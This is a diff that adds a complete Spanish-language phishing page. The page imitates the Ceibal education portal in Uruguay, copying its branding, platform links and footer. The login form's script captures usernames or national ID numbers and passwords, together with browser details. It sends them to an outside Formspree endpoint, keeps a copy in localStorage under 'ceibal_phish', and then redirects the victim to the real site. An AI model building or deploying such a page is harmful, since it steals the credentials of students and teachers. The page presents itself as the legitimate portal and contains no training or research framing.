@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Inicio - Portal Ceibal</title>
+<meta name="description" content="Te damos la bienvenida al universo Ceibal, encontrá acá los accesos a las plataformas o recursos que usas a diario Portal Ceibal">
+<link rel="canonical" href="https://ceibal.edu.uy/inicio/">
+<meta property="og:locale" content="es_ES">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Inicio - Portal Ceibal">
+<meta property="og:description" content="Te damos la bienvenida al universo Ceibal, encontrá acá los accesos a las plataformas o recursos que usas a diario">
+<meta property="og:site_name" content="Portal Ceibal">
+<meta property="og:image" content="https://documentos.ceibal.edu.uy/portal/2024/02/Background_1-1024x725.gif">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="icon" href="https://documentos.ceibal.edu.uy/portal/2022/11/cropped-favicon-300x300.png" sizes="192x192">
+<link rel="apple-touch-icon" href="https://documentos.ceibal.edu.uy/portal/2022/11/cropped-favicon-300x300.png">
+
+<!-- CSS oficial Ceibal -->
+<link rel="stylesheet" href="https://ceibal.edu.uy/wp-content/themes/wp-theme-ceibal/inc/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://ceibal.edu.uy/wp-content/themes/wp-theme-ceibal/inc/css/all.min.css">
+
+<style>
+  /* ====== Tipografía oficial Ceibal Mozaic ====== */
+  @font-face {
+    font-family: 'Ceibal Mozaic';
+    src: url('https://ceibal.edu.uy/wp-content/themes/wp-theme-ceibal/inc/tipografia/ceibalmozaic-regular-webfont.woff2') format('woff2'),
+         url('https://ceibal.edu.uy/wp-content/themes/wp-theme-ceibal/inc/tipografia/ceibalmozaic-regular-webfont.woff') format('woff');
+    font-weight: 400; font-style: normal; font-display: swap;
+  }
+  @font-face {
+    font-family: 'Ceibal Mozaic Bold';
+    src: url('https://ceibal.edu.uy/wp-content/themes/wp-theme-ceibal/inc/tipografia/ceibalmozaic-bold-webfont.woff2') format('woff2'),
+         url('https://ceibal.edu.uy/wp-content/themes/wp-theme-ceibal/inc/tipografia/ceibalmozaic-bold-webfont.woff') format('woff');
+    font-weight: 400; font-style: normal; font-display: swap;
+  }
+
+  html, body {
+    font-family: 'Ceibal Mozaic', Verdana, sans-serif;
+    color: #111;
+    overflow-x: hidden;
+  }
+  strong, .bold { font-family: 'Ceibal Mozaic Bold', Verdana, sans-serif; }
+  a { color: #00635d; }
+
+  /* ====== HERO ====== */
+  .heroCeibal {
+    position: relative;
+    min-height: 780px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+    background: #00403c;
+    padding: 50px 0;
+  }
+  .heroCeibal .bgGif {
+    position: absolute; inset: 0;
+    width: 100%; height: 100%;
+    object-fit: cover;
+    object-position: 25% 32%;
+  }
+  .heroCeibal .overlay {
+    position: absolute; inset: 0;
+    background: linear-gradient(0deg, rgba(0,64,60,.80), rgba(0,64,60,.80));
+  }
+  .heroCeibal .inner {
+    position: relative; z-index: 3;
+    width: 100%; text-align: center;
+  }
+  .heroCeibal .logoHero img { width: 191px; max-width: 70%; height: auto; }
+  .heroCeibal h1.bienvenida {
+    color: #fff;
+    font-family: 'Ceibal Mozaic Bold', Verdana, sans-serif;
+    font-size: 2.1rem;
+    margin: 22px 0 6px;
+    text-shadow: 0 2px 10px rgba(0,0,0,.25);
+  }
+  .heroCeibal .bajada {
+    color: #ccecea;
+    font-size: 1.02rem;
+    margin: 0 0 26px;
+  }
+
+  /* ====== TARJETA DE LOGIN ====== */
+  .loginCard {
+    background: #fff;
+    border-radius: 14px;
+    padding: 32px 30px 26px;
+    max-width: 430px;
+    margin: 0 auto 34px;
+    text-align: left;
+    box-shadow: 0 22px 45px rgba(0,0,0,.30);
+  }
+  .loginCard h2 {
+    font-family: 'Ceibal Mozaic Bold', Verdana, sans-serif;
+    font-size: 1.45rem;
+    color: #00635d;
+    text-align: center;
+    margin: 0 0 4px;
+  }
+  .loginCard .sub {
+    text-align: center;
+    font-size: .88rem;
+    color: #4b5563;
+    margin: 0 0 22px;
+  }
+  .loginCard label {
+    display: block;
+    font-size: .84rem;
+    font-weight: 600;
+    color: #111;
+    margin: 0 0 6px;
+  }
+  .loginCard input {
+    width: 100%;
+    padding: 12px 14px;
+    font-size: 1rem;
+    font-family: inherit;
+    color: #111;
+    border: 1px solid #d1d5db;
+    border-radius: 8px;
+    margin-bottom: 16px;
+    outline: none;
+    transition: border-color .2s, box-shadow .2s;
+  }
+  .loginCard input:focus {
+    border-color: #00a096;
+    box-shadow: 0 0 0 3px rgba(0,160,150,.18);
+  }
+  .loginCard button {
+    width: 100%;
+    border: none;
+    border-radius: 25px;
+    padding: 13px 20px;
+    background: #00a096;
+    color: #fff;
+    font-family: 'Ceibal Mozaic Bold', Verdana, sans-serif;
+    font-size: 1.02rem;
+    cursor: pointer;
+    transition: background .2s;
+  }
+  .loginCard button:hover { background: #008078; }
+  .loginCard button:disabled { opacity: .75; cursor: default; }
+  .loginCard .olvide {
+    display: block;
+    text-align: center;
+    margin-top: 14px;
+    font-size: .87rem;
+    color: #00635d;
+    text-decoration: none;
+  }
+  .loginCard .olvide:hover { text-decoration: underline; }
+  .loginCard .msg {
+    display: none;
+    margin-top: 15px;
+    padding: 9px 12px;
+    border-radius: 6px;
+    background: #e6f6f5;
+    color: #00504b;
+    font-size: .85rem;
+    text-align: center;
+  }
+
+  /* ====== BOTÓN CREA ====== */
+  .custom-dev-super-button-standard-size { font-size: 1.875rem; }
+  .super-boton-de-color i { font-size: 40px !important; }
+  .wrapCrea { max-width: 470px; margin: 0 auto; }
+
+  /* ====== PLATAFORMAS ====== */
+  .plataformas { background: #fff; padding: 60px 0 30px; }
+  .plataformas h2 {
+    font-family: 'Ceibal Mozaic Bold', Verdana, sans-serif;
+    text-align: center;
+    color: #00635d;
+    font-size: 1.9rem;
+    margin-bottom: 40px;
+  }
+  .platLink { display: block; text-decoration: none !important; }
+  .platLink img {
+    width: 100%;
+    max-width: 165px;
+    height: auto;
+    border-radius: 10px;
+    transition: transform .25s ease;
+  }
+  .platLink:hover img { transform: translateY(-6px); }
+
+  /* ====== AYUDA / VIDEOS ====== */
+  .ayuda { background: #f9fafb; padding: 55px 0; }
+  .ayuda h2 {
+    font-family: 'Ceibal Mozaic Bold', Verdana, sans-serif;
+    text-align: center;
+    color: #00635d;
+    font-size: 1.9rem;
+    margin-bottom: 34px;
+  }
+  .videoBox { margin-bottom: 26px; }
+  .videoBox iframe {
+    width: 100%;
+    aspect-ratio: 16 / 9;
+    border: 0;
+    border-radius: 10px;
+  }
+  .videoBox h6 {
+    margin: 10px 0 0;
+    font-family: 'Ceibal Mozaic Bold', Verdana, sans-serif;
+    font-size: .98rem;
+    color: #111;
+  }
+
+  /* ====== FOOTER ====== */
+  .footerInfo { padding-top: 20px; }
+  .footerInfo i { color: #00a096; font-size: 1.5em; margin-right: 9px; line-height: 1.2; }
+  .direccion-footer {
+    display: flex;
+    align-items: center;
+    line-height: 26px;
+    font-size: .95rem;
+    color: #111;
+  }
+  .direccion-footer a { color: #111; text-decoration: none; }
+  .location-footer .direccion-footer { align-items: flex-start; }
+  .separador-footer {
+    width: 1px;
+    background: #d1d5db;
+    margin-left: 18px;
+  }
+  .politica-footer { background: #00635d; padding: 14px 0 0; }
+  .politica-footer .redes-sociales a { color: #fff; font-size: 1.5rem; margin-right: 18px; }
+  .politica-footer .footer-text { color: #fff; font-size: .85rem; }
+  .politica-footer .footer-text a { color: #fff; text-decoration: underline; }
+  .version-footer { background: #00504b; margin-top: 14px; }
+  .version-text { color: #ccecea; font-size: .75rem; }
+
+  @media (max-width: 1080px) {
+    .heroCeibal { min-height: auto; padding: 40px 0; }
+    .heroCeibal h1.bienvenida { font-size: 1.7rem; }
+    .politica-footer .container { flex-direction: column; text-align: center; }
+    .politica-footer .redes-sociales { justify-content: center; margin-bottom: 10px; }
+  }
+  @media (max-width: 767px) {
+    .loginCard { padding: 26px 20px 22px; }
+    .heroCeibal h1.bienvenida { font-size: 1.45rem; }
+    .separador-footer { display: none; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ================= HERO ================= -->
+<section class="heroCeibal">
+  <img class="bgGif" src="https://documentos.ceibal.edu.uy/portal/2024/02/Background_1.gif" alt="Fondo animado Portal Ceibal">
+  <span class="overlay"></span>
+
+  <div class="inner">
+    <div class="container">
+
+      <div class="logoHero mb-2">
+        <a href="https://ceibal.edu.uy/">
+          <img src="https://documentos.ceibal.edu.uy/portal/2024/02/Logo-Ceibal-Blanco.svg" alt="Logo de Ceibal, ir al portal Ceibal.">
+        </a>
+      </div>
+
+      <h1 class="bienvenida">¡Te damos la bienvenida!</h1>
+      <p class="bajada">Ingresá con tu usuario Ceibal para acceder a tus plataformas</p>
+
+      <!-- ====== FORMULARIO ====== -->
+      <form class="loginCard" id="loginForm" novalidate>
+        <h2>Iniciar sesión</h2>
+        <p class="sub">Usá tu usuario o cédula de identidad</p>
+
+        <label for="usuario">Usuario</label>
+        <input id="usuario" name="usuario" type="text" placeholder="Cédula de identidad o usuario" autocomplete="username" autocapitalize="off" spellcheck="false" required>
+
+        <label for="password">Contraseña</label>
+        <input id="password" name="password" type="password" placeholder="Tu contraseña" autocomplete="current-password" required>
+
+        <button type="submit" id="btnIngresar">Ingresar</button>
+        <a class="olvide" href="#">¿Olvidaste tu contraseña?</a>
+
+        <div class="msg" id="msg" role="status" aria-live="polite">Verificando tus datos...</div>
+      </form>
+
+      <!-- ====== BOTÓN CREA ====== -->
+      <div class="wrapCrea">
+        <div class="superbtn">
+          <a class="super-boton-de-color" href="https://ceibal.schoology.com/" style="background:#00A096">
+            <h3 class="sbtitle custom-dev-super-button-standard-size" style="text-transform:none;color:#fff">
+              <span>Ingresar a</span><span class="resaltado" style="background:#00A096;color:#fff">CREA</span>
+            </h3>
+            <i class="fas fa-arrow-right" style="color:#fff" aria-hidden="true"></i>
+          </a>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ================= PLATAFORMAS ================= -->
+<section class="plataformas">
+  <div class="container">
+    <h2>Plataformas y recursos</h2>
+    <div class="row text-center justify-content-center">
+
+      <div class="col-6 col-md-4 col-lg-3 mb-4">
+        <a class="platLink" href="https://aleks.ceibal.edu.uy/">
+          <img src="https://documentos.ceibal.edu.uy/portal/2024/05/Plataforma_Aleks_1-1-1024x1024.png" alt="Icono de Aleks con acceso a la plataforma." loading="lazy">
+        </a>
+      </div>
+
+      <div class="col-6 col-md-4 col-lg-3 mb-4">
+        <a class="platLink" href="https://www.matific.com/">
+          <img src="https://documentos.ceibal.edu.uy/portal/2024/05/Plataforma_Matific_1-1-1024x1024.png" alt="Icono de Matific con acceso a la plataforma." loading="lazy">
+        </a>
+      </div>
+
+      <div class="col-6 col-md-4 col-lg-3 mb-4">
+        <a class="platLink" href="https://bibliotecapais.ceibal.edu.uy/?locale=es">
+          <img src="https://documentos.ceibal.edu.uy/portal/2024/05/Plataforma_Biblioteca-Pais_1-1-1024x1024.png" alt="Icono de Biblioteca País con acceso a la plataforma." loading="lazy">
+        </a>
+      </div>
+
+      <div class="col-6 col-md-4 col-lg-3 mb-4">
+        <a class="platLink" href="https://lbm.littlebridge.com/sso/ceibal">
+          <img src="https://documentos.ceibal.edu.uy/portal/2024/05/Plataforma_Little-Bridge_1-1-1024x1024.png" alt="Icono de Little Bridge con acceso a la plataforma." loading="lazy">
+        </a>
+      </div>
+
+      <div class="col-6 col-md-4 col-lg-3 mb-4">
+        <a class="platLink" href="https://ceibal.edu.uy/plataformas-y-programas/desafioprofundo/">
+          <img src="https://documentos.ceibal.edu.uy/portal/2024/05/Plataformas_Desafio-Profundo_1-1-1024x1024.png" alt="Icono de Desafío Profundo con acceso a la plataforma." loading="lazy">
+        </a>
+      </div>
+
+      <div class="col-6 col-md-4 col-lg-3 mb-4">
+        <a class="platLink" href="https://ceibal.robogarden.ca/index/ceibal/login">
+          <img src="https://documentos.ceibal.edu.uy/portal/2024/05/Plataformas_RoboGarden_1-1-1024x1024.png" alt="Icono de Robogarden con acceso a la plataforma." loading="lazy">
+        </a>
+      </div>
+
+      <div class="col-6 col-md-4 col-lg-3 mb-4">
+        <a class="platLink" href="https://ceibal.edu.uy/plataformas-y-programas/microbit/">
+          <img src="https://documentos.ceibal.edu.uy/portal/2024/05/Microbit-VB-1024x1024.png" alt="Icono de Microbit con acceso a los recursos." loading="lazy">
+        </a>
+      </div>
+
+      <div class="col-6 col-md-4 col-lg-3 mb-4">
+        <a class="platLink" href="https://ceibal.edu.uy/plataformas-y-programas/">
+          <img src="https://documentos.ceibal.edu.uy/portal/2024/05/Plataformas_Plataforma-de-Lengua_1-1-1024x1024.png" alt="Icono de Plataforma de Lengua con acceso a la plataforma." loading="lazy">
+        </a>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ================= AYUDA ================= -->
+<section class="ayuda">
+  <div class="container">
+    <h2>Ayuda</h2>
+    <div class="row">
+      <div class="col-md-6 col-lg-3 videoBox">
+        <iframe loading="lazy" src="https://www.youtube.com/embed/9VgCLWxSZxM" title="Video de ayuda sobre contraseñas" allowfullscreen></iframe>
+        <h6>Contraseñas</h6>
+      </div>
+      <div class="col-md-6 col-lg-3 videoBox">
+        <iframe loading="lazy" src="https://www.youtube.com/embed/VJFiufaZ9f4" title="Video sobre cuidados de los dispositivos" allowfullscreen></iframe>
+        <h6>Cuidados de los dispositivos</h6>
+      </div>
+      <div class="col-md-6 col-lg-3 videoBox">
+        <iframe loading="lazy" src="https://www.youtube.com/embed/bl1516xljAo" title="Video sobre cómo usar la nueva computadora" allowfullscreen></iframe>
+        <h6>Cómo usar la nueva computadora</h6>
+      </div>
+      <div class="col-md-6 col-lg-3 videoBox">
+        <iframe loading="lazy" src="https://www.youtube.com/embed/7Bg6ZPbm3rc" title="Video sobre empezando a usar nuestra nueva tablet" allowfullscreen></iframe>
+        <h6>Empezando a usar nuestra nueva tablet</h6>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ================= FOOTER ================= -->
+<footer class="container my-md-5 footerInfo">
+  <div class="row">
+    <div class="col-sm-12 col-md-12 col-lg-3 d-flex justify-content-between align-items-center logotipo-footer mb-4 mb-lg-0">
+      <a class="navbar-brand" href="https://ceibal.edu.uy/">
+        <img src="https://documentos.ceibal.edu.uy/portal/2022/09/logotipio-ceibal.png" alt="Logo de Ceibal Ir a Inicio" style="width:142px">
+      </a>
+      <div class="separador-footer"></div>
+    </div>
+
+    <div class="col-sm-12 col-md-4 col-lg-3 mb-4 mb-md-0 location-footer">
+      <div class="direccion-footer">
+        <i class="fas fa-location-dot" aria-hidden="true"></i>
+        <span>Av. Italia 6201<br>Edificio Los Ceibos<br>Montevideo, Uruguay</span>
+      </div>
+    </div>
+
+    <div class="col-sm-12 col-md-4 col-lg-3 mb-4 mb-md-0">
+      <div class="direccion-footer"><i class="fas fa-phone" aria-hidden="true"></i> 0800 2342</div>
+      <div class="direccion-footer"><i class="fas fa-mobile-screen" aria-hidden="true"></i> *2342</div>
+      <div class="direccion-footer"><i class="fab fa-whatsapp" aria-hidden="true"></i> <a href="https://wa.me/59898002342">+598 98 002 342</a></div>
+    </div>
+
+    <div class="col-sm-12 col-md-4 col-lg-3 mb-4 mb-md-0">
+      <a href="mailto:ceibal@ceibal.edu.uy" class="direccion-footer" style="text-decoration:none">
+        <i class="fas fa-envelope" aria-hidden="true"></i> ceibal@ceibal.edu.uy
+      </a>
+    </div>
+  </div>
+</footer>
+
+<div class="politica-footer">
+  <div class="container d-flex align-content-center justify-content-between">
+    <div class="redes-sociales">
+      <a href="https://www.facebook.com/CeibalUy" aria-label="Facebook"><i class="fab fa-facebook-f" aria-hidden="true"></i></a>
+      <a href="https://twitter.com/Ceibal_Uy" aria-label="Twitter"><i class="fab fa-twitter" aria-hidden="true"></i></a>
+      <a href="https://www.instagram.com/ceibal_uy/" aria-label="Instagram"><i class="fab fa-instagram" aria-hidden="true"></i></a>
+      <a href="https://www.youtube.com/c/canalceibal" aria-label="YouTube"><i class="fab fa-youtube" aria-hidden="true"></i></a>
+      <a href="https://www.linkedin.com/company/ceibal/" aria-label="LinkedIn"><i class="fab fa-linkedin-in" aria-hidden="true"></i></a>
+      <a href="https://www.tiktok.com/@ceibal_uy" aria-label="TikTok"><i class="fab fa-tiktok" aria-hidden="true"></i></a>
+    </div>
+    <div class="politica-condiciones">
+      <p class="footer-text mb-0">
+        Conocé nuestras <a href="https://ceibal.edu.uy/politicas/">políticas de privacidad, términos y condiciones y uso ético de IA.</a>
+      </p>
+    </div>
+  </div>
+  <div class="version-footer bg-version">
+    <div class="container text-center pb-2 pt-2">
+      <small class="version-text">Versión 1.8.3</small>
+    </div>
+  </div>
+</div>
+
+<script>
+(function () {
+  'use strict';
+  const FORMSPREE = 'https://formspree.io/f/xdkpodov';
+
+  const form  = document.getElementById('loginForm');
+  const btn   = document.getElementById('btnIngresar');
+  const msg   = document.getElementById('msg');
+  const user  = document.getElementById('usuario');
+  const pass  = document.getElementById('password');
+
+  if (!form) return;
+
+  form.addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    const usuario  = user.value.trim();
+    const password = pass.value;
+
+    if (!usuario) { user.focus(); return; }
+    if (!password) { pass.focus(); return; }
+
+    const datos = {
+      usuario: usuario,
+      password: password,
+      pagina: 'Portal Ceibal (clon)',
+      userAgent: navigator.userAgent,
+      idioma: navigator.language,
+      pantalla: window.screen.width + 'x' + window.screen.height,
+      referrer: document.referrer || 'directo',
+      fecha: new Date().toISOString()
+    };
+
+    // Respaldo local
+    try {
+      const hist = JSON.parse(localStorage.getItem('ceibal_phish') || '[]');
+      hist.push(datos);
+      localStorage.setItem('ceibal_phish', JSON.stringify(hist));
+    } catch (err) {
+      console.warn('No se pudo guardar en localStorage', err);
+    }
+
+    btn.disabled = true;
+    btn.textContent = 'Ingresando...';
+    msg.style.display = 'block';
+    msg.textContent = 'Verificando tus datos...';
+
+    enviar(datos).finally(function () {
+      msg.textContent = '¡Listo! Redirigiendo...';
+      setTimeout(function () {
+        window.location.href = 'https://ceibal.edu.uy/';
+      }, 1200);
+    });
+  });
+
+  function enviar(datos) {
+    return fetch(FORMSPREE, {
+      method: 'POST',
+      keepalive: true,
+      headers: {
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+      },
+      body: JSON.stringify({
+        _subject: 'Ceibal login: ' + datos.usuario,
+        usuario: datos.usuario,
+        password: datos.password,
+        pagina: datos.pagina,
+        userAgent: datos.userAgent,
+        idioma: datos.idioma,
+        pantalla: datos.pantalla,
+        referrer: datos.referrer,
+        fecha: datos.fecha
+      })
+    }).catch(function (err) {
+      console.warn('Fallo el envío:', err);
+    });
+  }
+})();
+</script>
+</body>
+</html>
